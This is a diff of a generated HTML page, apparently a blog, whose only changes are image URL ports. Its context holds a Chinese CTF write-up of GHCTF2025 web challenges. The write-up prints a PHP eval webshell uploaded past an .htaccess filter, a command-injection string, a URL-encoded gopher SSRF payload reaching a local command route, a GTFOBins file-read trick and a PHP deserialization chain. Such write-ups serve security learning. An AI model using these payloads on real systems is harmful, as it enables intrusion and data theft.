+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326110043406_hu4390965845695209336.png 480w, http://localhost:1313/p/ghctf2025/image-20250326110043406_hu2201971898095949178.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326110043406&#34;
@@ -3865,10 +3865,10 @@
 &lt;/div&gt;&lt;h3 id=&#34;upupup&#34;&gt;UPUPUP
 &lt;/h3&gt;&lt;h4 id=&#34;知识点文件上传htaccess绕过&#34;&gt;知识点：文件上传、.htaccess绕过
 &lt;/h4&gt;&lt;p&gt;​			文件上传&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326202004400.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326202004400.png&#34;
 	width=&#34;1407&#34;
 	height=&#34;805&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326202004400_hu6615437433083566604.png 480w, http://localhost:58266/p/ghctf2025/image-20250326202004400_hu15840451224187758550.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326202004400_hu6615437433083566604.png 480w, http://localhost:1313/p/ghctf2025/image-20250326202004400_hu15840451224187758550.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326202004400&#34;
@@ -3880,10 +3880,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​			可以看到是阿帕奇服务器，可以联想到.htaccess文件，直接传有waf，可以再文件前面加GIF89A&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326202746945.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326202746945.png&#34;
 	width=&#34;1632&#34;
 	height=&#34;460&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326202746945_hu3376145021051609445.png 480w, http://localhost:58266/p/ghctf2025/image-20250326202746945_hu6824886971641475112.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326202746945_hu3376145021051609445.png 480w, http://localhost:1313/p/ghctf2025/image-20250326202746945_hu6824886971641475112.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326202746945&#34;
@@ -3895,10 +3895,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​			1.png同理&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326203141333.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326203141333.png&#34;
 	width=&#34;1553&#34;
 	height=&#34;416&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326203141333_hu7368071416389475548.png 480w, http://localhost:58266/p/ghctf2025/image-20250326203141333_hu1122238089035042065.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326203141333_hu7368071416389475548.png 480w, http://localhost:1313/p/ghctf2025/image-20250326203141333_hu1122238089035042065.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326203141333&#34;
@@ -3923,10 +3923,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#define height 1
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326204001695.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326204001695.png&#34;
 	width=&#34;548&#34;
 	height=&#34;187&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326204001695_hu5485473935787895885.png 480w, http://localhost:58266/p/ghctf2025/image-20250326204001695_hu12154983236838868928.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326204001695_hu5485473935787895885.png 480w, http://localhost:1313/p/ghctf2025/image-20250326204001695_hu12154983236838868928.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326204001695&#34;
@@ -3955,10 +3955,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326204913870.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326204913870.png&#34;
 	width=&#34;962&#34;
 	height=&#34;474&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326204913870_hu13176499523256564959.png 480w, http://localhost:58266/p/ghctf2025/image-20250326204913870_hu10873180424155314012.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326204913870_hu13176499523256564959.png 480w, http://localhost:1313/p/ghctf2025/image-20250326204913870_hu10873180424155314012.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326204913870&#34;
@@ -3970,10 +3970,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​			蚁剑连接太麻烦了，我直接命令执行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250326205041686.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250326205041686.png&#34;
 	width=&#34;1293&#34;
 	height=&#34;700&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250326205041686_hu17970109964927527176.png 480w, http://localhost:58266/p/ghctf2025/image-20250326205041686_hu10919685348934997958.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250326205041686_hu17970109964927527176.png 480w, http://localhost:1313/p/ghctf2025/image-20250326205041686_hu10919685348934997958.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250326205041686&#34;
@@ -4338,10 +4338,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​		审计代码，发现可以get请求action=run，然后还有input参数可以进行命令执行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250327105204800.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250327105204800.png&#34;
 	width=&#34;1053&#34;
 	height=&#34;750&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250327105204800_hu11122023950687963205.png 480w, http://localhost:58266/p/ghctf2025/image-20250327105204800_hu13358879287493618221.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250327105204800_hu11122023950687963205.png 480w, http://localhost:1313/p/ghctf2025/image-20250327105204800_hu13358879287493618221.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250327105204800&#34;
@@ -4361,10 +4361,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;action=run&amp;amp;input=ls${IFS}/;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250327105443373.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250327105443373.png&#34;
 	width=&#34;522&#34;
 	height=&#34;107&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250327105443373_hu10192121952103068132.png 480w, http://localhost:58266/p/ghctf2025/image-20250327105443373_hu2018250712696183905.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250327105443373_hu10192121952103068132.png 480w, http://localhost:1313/p/ghctf2025/image-20250327105443373_hu2018250712696183905.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250327105443373&#34;
@@ -4375,10 +4375,10 @@
 		data-flex-basis=&#34;1170px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250327105718629.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250327105718629.png&#34;
 	width=&#34;773&#34;
 	height=&#34;109&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250327105718629_hu5525632438255914193.png 480w, http://localhost:58266/p/ghctf2025/image-20250327105718629_hu6847085414032857136.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250327105718629_hu5525632438255914193.png 480w, http://localhost:1313/p/ghctf2025/image-20250327105718629_hu6847085414032857136.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250327105718629&#34;
@@ -4401,10 +4401,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​		然后连接蚁剑，发现蚁剑也不能查看flag的内容，是因为没有权限（第一次知道蚁剑还能连终端，太帅了）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250327115445908.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250327115445908.png&#34;
 	width=&#34;401&#34;
 	height=&#34;78&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250327115445908_hu13468022303575457270.png 480w, http://localhost:58266/p/ghctf2025/image-20250327115445908_hu12561142384184864614.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250327115445908_hu13468022303575457270.png 480w, http://localhost:1313/p/ghctf2025/image-20250327115445908_hu12561142384184864614.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250327115445908&#34;
@@ -4420,10 +4420,10 @@
 &lt;p&gt;​		我们发现有个wc文件，从wp那里可以找到以下文档&lt;/p&gt;
 &lt;p&gt;​		&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/wc/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;wc | GTFOBins&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250327115958914.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250327115958914.png&#34;
 	width=&#34;1551&#34;
 	height=&#34;1069&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250327115958914_hu6204643571617774602.png 480w, http://localhost:58266/p/ghctf2025/image-20250327115958914_hu2762962641821543326.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250327115958914_hu6204643571617774602.png 480w, http://localhost:1313/p/ghctf2025/image-20250327115958914_hu2762962641821543326.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250327115958914&#34;
@@ -4435,10 +4435,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​		在这个文档中能找到wc的使用方法，这里直接在蚁剑的终端执行命令就行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250327120108825.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250327120108825.png&#34;
 	width=&#34;763&#34;
 	height=&#34;62&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250327120108825_hu7020999516352486495.png 480w, http://localhost:58266/p/ghctf2025/image-20250327120108825_hu14692396331727801177.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250327120108825_hu7020999516352486495.png 480w, http://localhost:1313/p/ghctf2025/image-20250327120108825_hu14692396331727801177.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250327120108825&#34;
@@ -4452,10 +4452,10 @@
 &lt;h3 id=&#34;goph3rrr&#34;&gt;Goph3rrr
 &lt;/h3&gt;&lt;h4 id=&#34;知识点ssrf_gopher协议&#34;&gt;知识点：SSRF_gopher协议
 &lt;/h4&gt;&lt;p&gt;​	这个题目其实猜的到是ssrf的gopher协议&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402150628095.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402150628095.png&#34;
 	width=&#34;2303&#34;
 	height=&#34;985&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402150628095_hu8195881428165619442.png 480w, http://localhost:58266/p/ghctf2025/image-20250402150628095_hu8421689326601272954.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402150628095_hu8195881428165619442.png 480w, http://localhost:1313/p/ghctf2025/image-20250402150628095_hu8421689326601272954.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402150628095&#34;
@@ -4467,10 +4467,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	页面什么都没有，dirsearch一下，发现app.py&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402152207745.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402152207745.png&#34;
 	width=&#34;827&#34;
 	height=&#34;345&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402152207745_hu10610466253750836846.png 480w, http://localhost:58266/p/ghctf2025/image-20250402152207745_hu5420531875114996647.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402152207745_hu10610466253750836846.png 480w, http://localhost:1313/p/ghctf2025/image-20250402152207745_hu5420531875114996647.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402152207745&#34;
@@ -4482,10 +4482,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	审计代码后发现Manage路由里可以通过post传cmd命令执行，但是指定了只有本地可以访问。但是在Gopher路由里我们可以get传url，在这里打gopher协议进行ssrf，让Gopher路由替我们在Manage路由里post  cmd。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402154120736.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402154120736.png&#34;
 	width=&#34;865&#34;
 	height=&#34;307&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402154120736_hu5391419396546779982.png 480w, http://localhost:58266/p/ghctf2025/image-20250402154120736_hu9248322093603749187.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402154120736_hu5391419396546779982.png 480w, http://localhost:1313/p/ghctf2025/image-20250402154120736_hu9248322093603749187.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402154120736&#34;
@@ -4496,10 +4496,10 @@
 		data-flex-basis=&#34;676px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402155341083.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402155341083.png&#34;
 	width=&#34;1016&#34;
 	height=&#34;419&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402155341083_hu18395682633724941817.png 480w, http://localhost:58266/p/ghctf2025/image-20250402155341083_hu5698360251789802315.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402155341083_hu18395682633724941817.png 480w, http://localhost:1313/p/ghctf2025/image-20250402155341083_hu5698360251789802315.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402155341083&#34;
@@ -4512,10 +4512,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​	我们先去/Manage路由里post一个cmd=env。抓包拿到编码前的pyload。&lt;/p&gt;
 &lt;p&gt;(至于为什么是env查看环境变量，其实也可以)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402160953015.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402160953015.png&#34;
 	width=&#34;1675&#34;
 	height=&#34;888&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402160953015_hu17079044972641181794.png 480w, http://localhost:58266/p/ghctf2025/image-20250402160953015_hu11829366997516795742.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402160953015_hu17079044972641181794.png 480w, http://localhost:1313/p/ghctf2025/image-20250402160953015_hu11829366997516795742.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402160953015&#34;
@@ -4553,10 +4553,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;url=gopher%3A//0.0.0.0%3A8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402163427536.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402163427536.png&#34;
 	width=&#34;1766&#34;
 	height=&#34;590&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402163427536_hu6438376543938368597.png 480w, http://localhost:58266/p/ghctf2025/image-20250402163427536_hu10919629067309904552.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402163427536_hu6438376543938368597.png 480w, http://localhost:1313/p/ghctf2025/image-20250402163427536_hu10919629067309904552.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402163427536&#34;
@@ -4571,10 +4571,10 @@
 &lt;h3 id=&#34;ez_readfile&#34;&gt;ez_readfile
 &lt;/h3&gt;&lt;h4 id=&#34;知识点docker-entrypointshfile_get_contents命令执行没写&#34;&gt;知识点：docker-entrypoint.sh，file_get_contents命令执行（没写）
 &lt;/h4&gt;&lt;p&gt;​	题面很简单，md5强碰撞，用fastcoll生成即可。&lt;/p&gt;
-&lt;p&gt;​		&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402193246839.png&#34;
+&lt;p&gt;​		&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402193246839.png&#34;
 	width=&#34;833&#34;
 	height=&#34;240&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402193246839_hu16468117415148963289.png 480w, http://localhost:58266/p/ghctf2025/image-20250402193246839_hu17502383105045171418.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402193246839_hu16468117415148963289.png 480w, http://localhost:1313/p/ghctf2025/image-20250402193246839_hu17502383105045171418.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402193246839&#34;
@@ -4585,10 +4585,10 @@
 		data-flex-basis=&#34;833px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402193926443.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402193926443.png&#34;
 	width=&#34;1323&#34;
 	height=&#34;892&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402193926443_hu18359316452485725450.png 480w, http://localhost:58266/p/ghctf2025/image-20250402193926443_hu7851505199141803262.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402193926443_hu18359316452485725450.png 480w, http://localhost:1313/p/ghctf2025/image-20250402193926443_hu7851505199141803262.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402193926443&#34;
@@ -4599,10 +4599,10 @@
 		data-flex-basis=&#34;355px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402194132236.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402194132236.png&#34;
 	width=&#34;1818&#34;
 	height=&#34;790&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402194132236_hu11273863816606666297.png 480w, http://localhost:58266/p/ghctf2025/image-20250402194132236_hu9194778668804638451.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402194132236_hu11273863816606666297.png 480w, http://localhost:1313/p/ghctf2025/image-20250402194132236_hu9194778668804638451.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402194132236&#34;
@@ -4617,10 +4617,10 @@
 &lt;p&gt;​	这里预期解是用CVE-2024-2961即file_get_contents文件读取rce漏洞，有点过于繁琐（300行代码的脚本），这里就先不记录了&lt;/p&gt;
 &lt;p&gt;​	非预期解是读取docker-entrypoint.sh文件，出题人大部分使用(&lt;a class=&#34;link&#34; href=&#34;https://github.com/CTF-Archives/ctf-docker-template&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://github.com/CTF-Archives/ctf-docker-template&lt;/a&gt;)里面的模板，然后出题人可能图方便，会遗留flag在该文件中。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402195143044.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402195143044.png&#34;
 	width=&#34;1866&#34;
 	height=&#34;729&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402195143044_hu17764612333311857332.png 480w, http://localhost:58266/p/ghctf2025/image-20250402195143044_hu8171004373803498219.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402195143044_hu17764612333311857332.png 480w, http://localhost:1313/p/ghctf2025/image-20250402195143044_hu8171004373803498219.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402195143044&#34;
@@ -4640,10 +4640,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402195256458.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402195256458.png&#34;
 	width=&#34;1771&#34;
 	height=&#34;840&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402195256458_hu5387472965362162358.png 480w, http://localhost:58266/p/ghctf2025/image-20250402195256458_hu10891720976508347643.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402195256458_hu5387472965362162358.png 480w, http://localhost:1313/p/ghctf2025/image-20250402195256458_hu10891720976508347643.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402195256458&#34;
@@ -4955,10 +4955,10 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​	注入点并不是简单的eval，而是利用php的原生类进行读取目录以及读取文件&lt;/p&gt;
 &lt;p&gt;​	这个原生类之前在basectf中也有遇到过，不过没有深入研究，这里正好复习一遍。&lt;/p&gt;
-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402202602017.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402202602017.png&#34;
 	width=&#34;686&#34;
 	height=&#34;280&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402202602017_hu17210225533363675270.png 480w, http://localhost:58266/p/ghctf2025/image-20250402202602017_hu4549621715597444760.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402202602017_hu17210225533363675270.png 480w, http://localhost:1313/p/ghctf2025/image-20250402202602017_hu4549621715597444760.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402202602017&#34;
@@ -4996,10 +4996,10 @@
 &lt;p&gt;​	我们找到链尾之后，就需要去还原整条pop链了&lt;/p&gt;
 &lt;p&gt;​	从链尾的__ get()函数开始，读取不可访问（protected或private）或不存在的属性的值时，__ get()会被自动调用。&lt;/p&gt;
 &lt;p&gt;​	我们找到Philosopher类，发现这个类中的hey是不存在的属性，可以直接被调用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402205228754.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402205228754.png&#34;
 	width=&#34;607&#34;
 	height=&#34;251&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402205228754_hu13561282346022624331.png 480w, http://localhost:58266/p/ghctf2025/image-20250402205228754_hu1872391523991813756.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402205228754_hu13561282346022624331.png 480w, http://localhost:1313/p/ghctf2025/image-20250402205228754_hu1872391523991813756.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402205228754&#34;
@@ -5119,10 +5119,10 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;​	那么接下来就是__ invoke()函数__ invoke()：当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。&lt;/p&gt;
 &lt;p&gt;​	我们找到接下来的类，fruit4会被当作函数运行，然后就是__ call()函数，在对象中调用一个不可访问方法时，__call会被调用。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250402210530607.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250402210530607.png&#34;
 	width=&#34;525&#34;
 	height=&#34;333&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250402210530607_hu13879868064835654890.png 480w, http://localhost:58266/p/ghctf2025/image-20250402210530607_hu2689007682852128881.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/ghctf2025/image-20250402210530607_hu13879868064835654890.png 480w, http://localhost:1313/p/ghctf2025/image-20250402210530607_hu2689007682852128881.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250402210530607&#34;
@@ -5134,10 +5134,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	我们找到接下来的这个类，它会调用add()这个不存在的函数，所以可以触发__call()，之后就需要触发toString()：当一个类被当成字符串时输出时自动调用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/ghctf2025/image-20250403111933763.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/ghctf2025/image-20250403111933763.png&#34;
 	width=&#34;818&#34;
 	height=&#34;532&#34;
-	srcset=&#34;http://localhost:58266/p/ghctf2025/image-20250403111933763_hu16629013937075566826.png 480w, http://localhost:58266/p/ghctf2025/image-20250403111933763_hu8262287769483651399.png 1024w&#34;
